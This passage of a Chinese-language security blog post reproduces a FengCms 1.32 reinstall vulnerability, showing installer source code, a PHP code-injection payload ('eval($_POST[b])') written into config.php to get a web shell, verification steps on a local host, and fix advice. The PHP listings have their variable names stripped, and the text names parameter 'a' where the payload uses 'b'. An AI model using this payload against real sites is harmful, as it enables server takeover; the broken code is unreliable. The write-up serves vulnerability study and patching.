<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line"></span><br><span class="line">define(<span class="string">"TPL_INCLUDE"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义当前路径</span></span><br><span class="line">define(<span class="string">'ABS_PATH'</span>,dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">define(<span class="string">'ROOT_PATH'</span>,dirname(ABS_PATH));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(![<span class="string">'step'</span>])[<span class="string">'step'</span>]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">=ROOT_PATH.<span class="string">'/config.php'</span>;</span><br><span class="line">=ABS_PATH.<span class="string">'/install.sql'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(file_exists(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'[removed]alert("系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！");[removed]'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;meta http-equiv="refresh" content="0;url=/"&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>([<span class="string">'step'</span>])&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'1'</span>: <span class="comment">//安装许可协议</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step1.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'2'</span>: <span class="comment">//检查安装环境是否满足要求</span></span><br><span class="line"></span><br><span class="line">          = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'gd'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagepng'</span>))  .= <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagejpeg'</span>))  .= <span class="string">' jpg'</span>;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'imagegif'</span>))  .= <span class="string">' gif'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">if</span>(extension_loaded(<span class="string">'json'</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(function_exists(<span class="string">'json_decode'</span>) &amp;&amp; function_exists(<span class="string">'json_encode'</span>))  = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//新加fsockopen 函数判断,此函数影响安装后会员注册及登录操作。</span></span><br><span class="line">        <span class="keyword">if</span>(function_exists(<span class="string">'fsockopen'</span>)) &#123;</span><br><span class="line">             = <span class="string">'1'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         = preg_match(<span class="string">"/^[0-9.]&#123;7,15&#125;$/"</span>, @gethostbyname(<span class="string">'www.baidu.cn'</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//是否满足FengCms安装需求</span></span><br><span class="line"></span><br><span class="line">         = (phpversion() &gt;= <span class="string">'5.2.0'</span> &amp;&amp; extension_loaded(<span class="string">'mysql'</span>) &amp;&amp;  &amp;&amp;  &amp;&amp; ) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//配置文件是否存在和可写</span></span><br><span class="line"></span><br><span class="line">         = (is_readable() &amp;&amp; is_writable()) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上传目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模块导出目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/upload/module"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//前台缓存目录是否可写</span></span><br><span class="line">         = (dir_writeable(ROOT_PATH.<span class="string">"/app/cache"</span>)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step2.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'3'</span>: <span class="comment">//填写数据库信息</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step3.php"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'4'</span>: <span class="comment">//正在安装</span></span><br><span class="line"></span><br><span class="line">        =@mysql_connect([<span class="string">'host'</span>],[<span class="string">'user'</span>],[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("链接主机失败，请检查主机地址、用户名和密码是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(intval(mysql_get_server_info())&lt;<span class="number">5</span>)&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">'[removed]alert("您的MYSQL版本为'</span>. mysql_get_server_info().<span class="string">'，版本太低，不能安装FengCms!");history.go(-1);[removed]'</span>;</span><br><span class="line">                <span class="keyword">exit</span>();  </span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!mysql_query(<span class="string">"CREATE DATABASE "</span>. [<span class="string">'dbname'</span>] .<span class="string">" default character set utf8;"</span>,))</span><br><span class="line"></span><br><span class="line">                    &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'[removed]alert("数据库不存在，创建不成功");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(!mysql_select_db([<span class="string">'dbname'</span>],))&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">'[removed]alert("链接数据库失败，请检查数据库是否正确！");history.go(-1);[removed]'</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">include</span> <span class="string">"data.php"</span>;</span><br><span class="line"></span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> <span class="string">'5'</span>: <span class="comment">//安装完成</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">include</span> ABS_PATH.<span class="string">"/step/step5.php"</span>;</span><br><span class="line">         = fopen(ROOT_PATH.<span class="string">'/upload/INSTALL'</span>,<span class="string">'w'</span>);</span><br><span class="line">        fclose ();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>上述代码代码首先判断<code>upload/INSTALL</code>文件是否存在，若存在，就弹出JavaScript代码，提示我们需要删除目录下的INSTALL文件，如图：</p>
<p>但在这里我们直接点击确定即可，可以无视它的提示，即是不删除INSTALL文件，也可以进行安装操作。</p>
<p>我们再来看看<code>Install/install.php</code>文件，代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">// = fopen(, "w");   //以写入的方式打开config.php这个文件。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>([<span class="string">'install'</span>])&#123;  <span class="comment">//获取用户提交的数据。  </span></span><br><span class="line">=[<span class="string">'host'</span>];  </span><br><span class="line">=[<span class="string">'user'</span>];  </span><br><span class="line">=[<span class="string">'password'</span>];  </span><br><span class="line">=[<span class="string">'dbname'</span>];  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!=@mysql_connect(,,))&#123;  </span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"连接数据库失败！请返回上一页检查连接参数 返回修改"</span>;  </span><br><span class="line">       <span class="keyword">exit</span>();  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">  mysql_query(<span class="string">"set names gb2312"</span>);  <span class="comment">//设置数据库的编码，注意要与前面一致。  </span></span><br><span class="line">   <span class="keyword">if</span>(!mysql_select_db(,))&#123;   <span class="comment">//如果数据库不存在，我们就进行创建。  </span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span>(!mysql_query())&#123;  </span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"创建数据库失败，请确认是否有足够的权限！返回修改"</span>;  </span><br><span class="line">           <span class="keyword">exit</span>();  </span><br><span class="line">          &#125;  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> file_get_contents();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">exit</span>;</span><br><span class="line">     = fopen(, <span class="string">"w"</span>);   <span class="comment">//以写入的方式打开config.php这个文件。  </span></span><br><span class="line">    fwrite(,);  <span class="comment">//将配置信息写入config.php文件。  </span></span><br><span class="line">    fclose();  </span><br><span class="line">    <span class="keyword">include_once</span>(ABS_PATH.<span class="string">"config.php"</span>);   <span class="comment">//导入配置信息.  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//下面根据你实际的表的结构跟初始化表的数据来写，这些sql语句，我们在导出时可以找到。  </span></span><br><span class="line">   <span class="comment">//新建一个表test1  </span></span><br><span class="line">   [] = <span class="string">"CREATE TABLE `test1` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">    <span class="comment">//新建一个表test2  </span></span><br><span class="line">    [] = <span class="string">"CREATE TABLE `test2` (     </span></span><br><span class="line"><span class="string">                 `id` int(4) NOT NULL auto_increment,  </span></span><br><span class="line"><span class="string">                 `name` varchar(20) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                 `major` varchar(40) character set gb2312 NOT NULL,  </span></span><br><span class="line"><span class="string">                  PRIMARY KEY  (`id`)  </span></span><br><span class="line"><span class="string">                  ) ENGINE=InnoDB  DEFAULT CHARSET=gb2312 AUTO_INCREMENT=1;"</span>;  </span><br><span class="line">     <span class="comment">//为test1表默认初始化一些数据。  </span></span><br><span class="line">     []=<span class="string">"INSERT INTO `test1` (`name`, `major`) VALUES('张三','电子商务')"</span>;  </span><br><span class="line">     <span class="keyword">foreach</span>( <span class="keyword">as</span> )&#123;  </span><br><span class="line">            <span class="keyword">if</span>(!mysql_query())&#123;      <span class="comment">//依次执行以上的sql语句，就是创建表和初始化数据。  </span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"创建表失败或者初始化数据失败"</span>;  </span><br><span class="line">            <span class="keyword">exit</span>();  </span><br><span class="line">           &#125;  </span><br><span class="line">     &#125;  </span><br><span class="line">     mysql_close();  </span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"安装成功"</span>;<span class="comment">//可以做一个跳转到首页。  </span></span><br><span class="line">     <span class="keyword">exit</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里系统会判断根目录下的config.php文件是否可写，然后将数据使用POST提交方式，注意这里对传入的数值没有任何的过滤和检测，接下来提交给Config.php文件，我们继续查看config.php文件：</p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/AIakC5FdGL.png?imageslim" alt="mark"></p>
<p>我们这里就可以构造语句，在其安装时，可以插入Payload，对Config.php写入恶意的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
<p>这样我们就可以通过参数<code>a</code> ，去执行任意的代码。</p>
<h4 id="步骤2：验证漏洞"><a href="#步骤2：验证漏洞" class="headerlink" title="步骤2：验证漏洞"></a>步骤2：验证漏洞</h4><p><strong>注：如果点击确定后页面立即跳到首页，这时因为服务器配置高响应过快，在真实的场景中相应速度会很慢，足够我们输入相关的内容，这里将upload下INSTALL文件删除即可</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/install/index.php</span><br></pre></td></tr></table></figure>
<p>上述地址是FengCms的安装地址，打开后我们发现系统提示需要删除INSTALL文件，才可安装，通过上一步代码分析，我们得知，此处只是弹窗警示，程序代码仍然会继续执行下去，因此点击确定：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f_&apos;);eval($_POST[b]);//</span><br></pre></td></tr></table></figure>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/51cc51fkJa.png?imageslim" alt="mark"></p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/1HkJ57GBcd.png?imageslim" alt="mark"></p>
<p>当点击下一步之后，就安装成功了，将Payload插入到了Config.php文件中。</p>
<p>接下来访问<code>127.0.0.1</code> ，使用Post方式提交数据<code>a=phpinfo();</code> </p>
<p><img src="http://pn5jn1i1e.bkt.clouddn.com/180401/BEFJJ544k3.png?imageslim" alt="mark"></p>
<p>。。。</p>
<p>成功利用了FengCms重装漏洞。</p>
<p><strong>修复建议</strong></p>
<ul>
<li>升级最新版本</li>
<li>在Post写入时，严格增加过滤</li>
<li>验证INSTALL文件是否存在，如果存在则跳出安装流程</li>
</ul>
<p>参考：FengCms1.32系统重装漏洞导致getshell - 知道创宇 Seebug 漏洞平台<br><a href="https://www.seebug.org/vuldb/ssvid-93224" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-93224</a></p>

      
    </div>
    <footer class="article-footer">
      
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>

    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">下一页 &raquo;</a>
  </nav>

</section>
        
      </div>
      
        <div align="center" style="margin-top: 30px;"><hr class="hr" style="margin:0px; height:3px;"></div>
      
      <footer id="footer">
  

  <div class="container">
      	<div class="row">
	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
	      <p id="copyRightEn">Copyright &copy; 2016 - 2019 shackle All Rights Reserved.</p>
	      
	      
    		<p class="busuanzi_uv">
				访客数 : <span id="busuanzi_value_site_uv"></span> |  
				访问量 : <span id="busuanzi_value_site_pv"></span>
		    </p>
  		   
		</div>

		
  </div>
</footer>


<!-- min height -->

<script>
    var wrapdiv = document.getElementById("wrap");
    var contentdiv = document.getElementById("content");
    var allheader = document.getElementById("allheader");

    wrapdiv.style.minHeight = document.body.offsetHeight + "px";
    if (allheader != null) {
      contentdiv.style.minHeight = document.body.offsetHeight - allheader.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    } else {
      contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("footer").offsetHeight + "px";
    }
</script>
    </div>
    <!-- <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
    <a href="/about" class="mobile-nav-link">About</a>
  
</nav> -->
    

<!-- mathjax config similar to math.stackexchange -->

<script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
      processEscapes: true
    }
  });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
      tex2jax: {
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
    });
</script>

<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>

<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/scripts.js"></script>


  <script src="/js/home.js"></script>










	<div style="display: none;">
    <script src="https://s95.cnzz.com/z_stat.php?id=1261091520&web_id=1261091520" language="JavaScript"></script>
  </div>



	<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
	</script>






  </div>

  <div class="modal fade" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="display: none;">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h2 class="modal-title" id="myModalLabel">设置</h2>
      </div>
      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">


      <div class="modal-body">
          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseOne" onclick="javascript:setFontSize();" aria-expanded="true" aria-controls="collapseOne">
              正文字号大小
            </a>
          </div>
          <div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
          <div class="panel-body">
            您已调整页面字体大小
          </div>
        </div>
      


          <div style="margin:6px;">
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" onclick="javascript:setBackground();" aria-expanded="true" aria-controls="collapseTwo">
              夜间护眼模式
            </a>
        </div>
          <div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
          <div class="panel-body">
            夜间模式已经开启，再次单击按钮即可关闭 
          </div>
        </div>

        <div>
            <a data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="true" aria-controls="collapseThree">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关 于&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</a>
        </div>
         <div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
          <div class="panel-body">
            shackle
          </div>
          <div class="panel-body">
            Copyright © 2019 shackle All Rights Reserved.
          </div>
        </div>
      </div>


      <hr style="margin-top:0px; margin-bottom:0px; width:80%; border-top: 1px solid #000;">
      <hr style="margin-top:2px; margin-bottom:0px; width:80%; border-top: 3px solid #000;">
      <div class="modal-footer">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
      </div>
    </div>
  </div>
</div>
  
  <a id="rocket" href="#top" class=""></a>
  <script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
  
</body>
</html>